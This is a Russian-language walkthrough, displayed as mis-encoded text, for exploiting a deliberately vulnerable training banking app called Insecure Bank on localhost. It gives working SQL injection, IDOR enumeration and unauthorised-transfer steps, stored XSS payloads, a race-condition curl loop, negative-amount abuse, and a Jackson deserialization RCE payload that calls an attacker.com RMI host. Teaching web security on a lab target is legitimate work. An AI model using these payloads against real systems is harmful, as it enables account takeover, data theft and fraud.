# –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –£—è–∑–≤–∏–º–æ—Å—Ç–µ–π —á–µ—Ä–µ–∑ –§—Ä–æ–Ω—Ç–µ–Ω–¥

## –û–±–∑–æ—Ä

–≠—Ç–æ—Ç –¥–æ–∫—É–º–µ–Ω—Ç –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, –∫–∞–∫ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å —É—è–∑–≤–∏–º–æ—Å—Ç–∏ Insecure Bank —á–µ—Ä–µ–∑ –≤–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å (—Ñ—Ä–æ–Ω—Ç–µ–Ω–¥) –≤–º–µ—Å—Ç–æ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ç–µ—Å—Ç–æ–≤.

---

## –ó–∞–ø—É—Å–∫ –ü—Ä–∏–ª–æ–∂–µ–Ω–∏—è

```bash
mvn spring-boot:run
```

–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –±—É–¥–µ—Ç –¥–æ—Å—Ç—É–ø–Ω–æ –ø–æ –∞–¥—Ä–µ—Å—É: **http://localhost:8080**

> [!IMPORTANT]
> **–í–∞–∂–Ω–æ**: –í –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è—Ö –Ω–∏–∂–µ —É–∫–∞–∑–∞–Ω—ã **payload'—ã** (–≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ), –∫–æ—Ç–æ—Ä—ã–µ –Ω—É–∂–Ω–æ –≤–≤–æ–¥–∏—Ç—å –≤ **–ø–æ–ª—è —Ñ–æ—Ä–º**, –∞ –Ω–µ –≤ –∞–¥—Ä–µ—Å–Ω—É—é —Å—Ç—Ä–æ–∫—É –±—Ä–∞—É–∑–µ—Ä–∞. –ù–µ –∫–æ–ø–∏—Ä—É–π—Ç–µ URL —Ü–µ–ª–∏–∫–æ–º!

---

## 1. SQL Injection - –û–±—Ö–æ–¥ –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏

### –°—Ç—Ä–∞–Ω–∏—Ü–∞
**http://localhost:8080/login**

### –≠–∫—Å–ø–ª–æ–π—Ç

1. –û—Ç–∫—Ä–æ–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É –ª–æ–≥–∏–Ω–∞: **http://localhost:8080/login**
2. –í **—Ñ–æ—Ä–º–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ** –≤–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ:
   - **Username** (–ø–æ–ª–µ —Ñ–æ—Ä–º—ã): `admin`
   - **Password** (–ø–æ–ª–µ —Ñ–æ—Ä–º—ã): `' OR '1'='1`
3. –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É "Login"

> [!WARNING]
> **–ù–ï –≤—Å—Ç–∞–≤–ª—è–π—Ç–µ** URL –≤ –ø–æ–ª–µ username! –í–≤–æ–¥–∏—Ç–µ —Ç–æ–ª—å–∫–æ `admin` –≤ –ø–æ–ª–µ username –∏ `' OR '1'='1` –≤ –ø–æ–ª–µ password.

### –†–µ–∑—É–ª—å—Ç–∞—Ç
‚úÖ –í—ã –≤–æ–π–¥—ë—Ç–µ –≤ —Å–∏—Å—Ç–µ–º—É **–±–µ–∑ –∑–Ω–∞–Ω–∏—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –ø–∞—Ä–æ–ª—è**

### –û–±—ä—è—Å–Ω–µ–Ω–∏–µ
SQL-–∑–∞–ø—Ä–æ—Å —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```
–£—Å–ª–æ–≤–∏–µ `'1'='1'` –≤—Å–µ–≥–¥–∞ –∏—Å—Ç–∏–Ω–Ω–æ ‚Üí –æ–±—Ö–æ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏.

---

## 2. SQL Injection - –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –î–∞–Ω–Ω—ã—Ö

### –°—Ç—Ä–∞–Ω–∏—Ü–∞
**http://localhost:8080/admin/users?q=a**

### –≠–∫—Å–ø–ª–æ–π—Ç

1. –û—Ç–∫—Ä–æ–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø–æ–∏—Å–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
2. –í –ø–∞—Ä–∞–º–µ—Ç—Ä–µ `q` –≤–≤–µ–¥–∏—Ç–µ: `a' OR '1'='1`
3. –ü–æ–ª–Ω—ã–π URL: `http://localhost:8080/admin/users?q=a' OR '1'='1`

### –†–µ–∑—É–ª—å—Ç–∞—Ç
‚úÖ –û—Ç–æ–±—Ä–∞–∑—è—Ç—Å—è **–≤—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏** –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö

### –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ Payload'—ã
```
?q=a' UNION SELECT id, username, password, email FROM users--
?q=a' OR username LIKE '%admin%
```

---

## 3. IDOR - –î–æ—Å—Ç—É–ø –∫ –ß—É–∂–∏–º –°—á–µ—Ç–∞–º

### –°—Ç—Ä–∞–Ω–∏—Ü–∞
**http://localhost:8080/accounts/1**

### –≠–∫—Å–ø–ª–æ–π—Ç

1. –û—Ç–∫—Ä–æ–π—Ç–µ —Å—á—ë—Ç #1: `http://localhost:8080/accounts/1`
2. –ò–∑–º–µ–Ω–∏—Ç–µ ID –≤ URL: `http://localhost:8080/accounts/2`
3. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥–∏–µ ID: `/accounts/3`, `/accounts/4`, –∏ —Ç.–¥.

### –†–µ–∑—É–ª—å—Ç–∞—Ç
‚úÖ –í—ã –º–æ–∂–µ—Ç–µ **–ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –ª—é–±–æ–π —Å—á—ë—Ç** –±–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤–ª–∞–¥–µ–Ω–∏—è

### –≠–∫—Å–ø–ª–æ–π—Ç –ü–µ—Ä–µ–≤–æ–¥–∞

1. –ù–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ —Å—á—ë—Ç–∞ –Ω–∞–π–¥–∏—Ç–µ —Ñ–æ—Ä–º—É –ø–µ—Ä–µ–≤–æ–¥–∞
2. –£–∫–∞–∂–∏—Ç–µ:
   - **From Account ID**: ID —á—É–∂–æ–≥–æ —Å—á—ë—Ç–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, 2)
   - **To Account ID**: –≤–∞—à —Å—á—ë—Ç (–Ω–∞–ø—Ä–∏–º–µ—Ä, 1)
   - **Amount**: –ª—é–±–∞—è —Å—É–º–º–∞
3. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ä–º—É

‚úÖ –î–µ–Ω—å–≥–∏ –ø–µ—Ä–µ–≤–µ–¥—É—Ç—Å—è **—Å —á—É–∂–æ–≥–æ —Å—á—ë—Ç–∞ –Ω–∞ –≤–∞—à**!

---

## 4. Stored XSS - –í–Ω–µ–¥—Ä–µ–Ω–∏–µ JavaScript

### –°—Ç—Ä–∞–Ω–∏—Ü–∞
**http://localhost:8080/accounts/1** (–∏–ª–∏ –ª—é–±–æ–π —Å—á—ë—Ç —Å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏)

### –≠–∫—Å–ø–ª–æ–π—Ç

**–°–ø–æ—Å–æ–± 1: –ß–µ—Ä–µ–∑ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö (—Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–æ—Å—Ç—É–ø)**

–í—Å—Ç–∞–≤—å—Ç–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é —Å XSS-payload –≤ –æ–ø–∏—Å–∞–Ω–∏–∏:
```sql
INSERT INTO transaction (from_account_id, to_account_id, amount, description, created_at)
VALUES (1, 2, 10.00, '<script>alert("XSS")</script>', NOW());
```

**–°–ø–æ—Å–æ–± 2: –ß–µ—Ä–µ–∑ API (–µ—Å–ª–∏ –µ—Å—Ç—å endpoint —Å–æ–∑–¥–∞–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π)**

–û—Ç–ø—Ä–∞–≤—å—Ç–µ POST-–∑–∞–ø—Ä–æ—Å —Å XSS –≤ –ø–æ–ª–µ `description`:
```bash
curl -X POST http://localhost:8080/api/transactions \
  -H "Content-Type: application/json" \
  -d '{
    "fromAccountId": 1,
    "toAccountId": 2,
    "amount": 10.00,
    "description": "<script>alert(\"XSS\")</script>"
  }'
```

### –†–µ–∑—É–ª—å—Ç–∞—Ç
‚úÖ –ü—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å—á—ë—Ç–∞ –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è JavaScript

### –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è
–û—Ç–∫—Ä–æ–π—Ç–µ Developer Tools (F12) ‚Üí Console, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞.

---

## 5. Race Condition - –°–æ–∑–¥–∞–Ω–∏–µ –î–µ–Ω–µ–≥

### –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã
–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ **Burp Suite** –∏–ª–∏ **curl** –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤.

### –≠–∫—Å–ø–ª–æ–π—Ç —Å Burp Suite

1. –ü–µ—Ä–µ—Ö–≤–∞—Ç–∏—Ç–µ POST-–∑–∞–ø—Ä–æ—Å –ø–µ—Ä–µ–≤–æ–¥–∞ –¥–µ–Ω–µ–≥
2. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–≥–æ –≤ **Repeater**
3. –û—Ç–∫—Ä–æ–π—Ç–µ **Intruder** ‚Üí —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –ø–æ–∑–∏—Ü–∏—é –Ω–∞ –ª—é–±–æ–π –ø–∞—Ä–∞–º–µ—Ç—Ä
4. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ **Attack type**: Sniper
5. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ **Thread count**: 10
6. –ó–∞–ø—É—Å—Ç–∏—Ç–µ –∞—Ç–∞–∫—É

### –≠–∫—Å–ø–ª–æ–π—Ç —Å curl (bash)

```bash
#!/bin/bash
for i in {1..10}; do
  curl -X POST http://localhost:8080/transfer \
    -d "fromAccountId=1&toAccountId=2&amount=20" &
done
wait
```

### –†–µ–∑—É–ª—å—Ç–∞—Ç
‚úÖ –ò–∑-–∑–∞ race condition –ø—Ä–æ–∏–∑–æ–π–¥—É—Ç **lost updates** - –¥–µ–Ω—å–≥–∏ "—Å–æ–∑–¥–∞–¥—É—Ç—Å—è" –∏–ª–∏ "–ø–æ—Ç–µ—Ä—è—é—Ç—Å—è"

---

## 6. Defensive Programming - –û—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω—ã–µ –°—É–º–º—ã

### –°—Ç—Ä–∞–Ω–∏—Ü–∞
**http://localhost:8080/accounts/1** (—Ñ–æ—Ä–º–∞ –ø–µ—Ä–µ–≤–æ–¥–∞)

### –≠–∫—Å–ø–ª–æ–π—Ç

1. –û—Ç–∫—Ä–æ–π—Ç–µ —Ñ–æ—Ä–º—É –ø–µ—Ä–µ–≤–æ–¥–∞
2. –í –ø–æ–ª–µ **Amount** –≤–≤–µ–¥–∏—Ç–µ: `-100`
3. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ä–º—É

### –†–µ–∑—É–ª—å—Ç–∞—Ç
‚úÖ –û—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç—Å—è ‚Üí –º–æ–∂–Ω–æ **"–∫—Ä–∞—Å—Ç—å" –¥–µ–Ω—å–≥–∏ –æ–±—Ä–∞—Ç–Ω—ã–º –ø–µ—Ä–µ–≤–æ–¥–æ–º**

---

## 7. Insecure Deserialization (Jackson)

### –¢—Ä–µ–±–æ–≤–∞–Ω–∏—è
–ù—É–∂–µ–Ω endpoint, –ø—Ä–∏–Ω–∏–º–∞—é—â–∏–π JSON —Å –ø–æ–ª–∏–º–æ—Ä—Ñ–Ω–æ–π –¥–µ—Å–µ—Ä–∏–∞–ª–∏–∑–∞—Ü–∏–µ–π.

### –≠–∫—Å–ø–ª–æ–π—Ç

–ï—Å–ª–∏ –µ—Å—Ç—å API endpoint (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/api/data`):

```bash
curl -X POST http://localhost:8080/api/data \
  -H "Content-Type: application/json" \
  -d '{
    "@class": "java.util.HashMap",
    "key": "value"
  }'
```

### –ü—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–π Exploit (RCE)

```json
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://attacker.com:1099/Exploit",
  "autoCommit": true
}
```

### –†–µ–∑—É–ª—å—Ç–∞—Ç
‚úÖ Jackson –ø–æ–ø—ã—Ç–∞–µ—Ç—Å—è –∏–Ω—Å—Ç–∞–Ω—Ü–∏—Ä–æ–≤–∞—Ç—å —É–∫–∞–∑–∞–Ω–Ω—ã–π –∫–ª–∞—Å—Å ‚Üí **–ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–π RCE**

---

## –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–ª—è –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è

### 1. Browser Developer Tools (F12)
- **Network Tab**: –ø—Ä–æ—Å–º–æ—Ç—Ä –∑–∞–ø—Ä–æ—Å–æ–≤/–æ—Ç–≤–µ—Ç–æ–≤
- **Console**: –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ JavaScript
- **Storage**: –ø—Ä–æ—Å–º–æ—Ç—Ä cookies/session

### 2. Burp Suite Community Edition
- –ü–µ—Ä–µ—Ö–≤–∞—Ç HTTP-–∑–∞–ø—Ä–æ—Å–æ–≤
- –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
- –ü–æ–≤—Ç–æ—Ä –∑–∞–ø—Ä–æ—Å–æ–≤ (Repeater)
- –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è –∞—Ç–∞–∫ (Intruder)

### 3. curl
```bash
# GET –∑–∞–ø—Ä–æ—Å
curl http://localhost:8080/accounts/1

# POST –∑–∞–ø—Ä–æ—Å
curl -X POST http://localhost:8080/transfer \
  -d "fromAccountId=1&toAccountId=2&amount=100"

# –° cookies
curl -b "JSESSIONID=xxx" http://localhost:8080/accounts/1
```

### 4. Postman
- –£–¥–æ–±–Ω—ã–π GUI –¥–ª—è API-–∑–∞–ø—Ä–æ—Å–æ–≤
- –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∫–æ–ª–ª–µ–∫—Ü–∏–π
- –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è —Ç–µ—Å—Ç–æ–≤

---

## –°–æ–≤–µ—Ç—ã –ø–æ –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏

### 1. –ü–æ–ª—É—á–µ–Ω–∏–µ Session Cookie

–ü–æ—Å–ª–µ –ª–æ–≥–∏–Ω–∞ —á–µ—Ä–µ–∑ SQL Injection:
1. –û—Ç–∫—Ä–æ–π—Ç–µ Developer Tools ‚Üí Application ‚Üí Cookies
2. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –∑–Ω–∞—á–µ–Ω–∏–µ `JSESSIONID`
3. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –≤ curl: `-b "JSESSIONID=xxx"`

### 2. –û–±—Ö–æ–¥ CSRF (–µ—Å–ª–∏ –µ—Å—Ç—å)

–í —ç—Ç–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ CSRF-–∑–∞—â–∏—Ç—ã –Ω–µ—Ç, –Ω–æ –µ—Å–ª–∏ –±—ã –±—ã–ª–∞:
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ Burp Suite –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è CSRF-—Ç–æ–∫–µ–Ω–∞
- –í–∫–ª—é—á–∏—Ç–µ —Ç–æ–∫–µ–Ω –≤ –∑–∞–ø—Ä–æ—Å—ã

### 3. –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è

–°–æ–∑–¥–∞–π—Ç–µ —Å–∫—Ä–∏–ø—Ç –¥–ª—è –º–∞—Å—Å–æ–≤–æ–π —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏:
```bash
#!/bin/bash
# –ü–µ—Ä–µ–±–æ—Ä –≤—Å–µ—Ö —Å—á–µ—Ç–æ–≤ (IDOR)
for id in {1..100}; do
  curl -b "JSESSIONID=xxx" http://localhost:8080/accounts/$id
done
```

---

## –ò—Ç–æ–≥–∏

| –£—è–∑–≤–∏–º–æ—Å—Ç—å | –ú–µ—Ç–æ–¥ | –°–ª–æ–∂–Ω–æ—Å—Ç—å | –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç |
|------------|-------|-----------|------------|
| SQL Injection | Browser/curl | ‚≠ê –õ–µ–≥–∫–æ | Browser |
| IDOR | Browser/curl | ‚≠ê –õ–µ–≥–∫–æ | Browser |
| Stored XSS | curl/API | ‚≠ê‚≠ê –°—Ä–µ–¥–Ω–µ | curl/Postman |
| Race Condition | Burp/script | ‚≠ê‚≠ê‚≠ê –°–ª–æ–∂–Ω–æ | Burp Suite |
| Negative Amount | Browser | ‚≠ê –õ–µ–≥–∫–æ | Browser |
| Deserialization | curl/Burp | ‚≠ê‚≠ê‚≠ê –°–ª–æ–∂–Ω–æ | curl/Burp |

**–í—Å–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –º–æ–∂–Ω–æ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å —á–µ—Ä–µ–∑ —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥!** üéØ
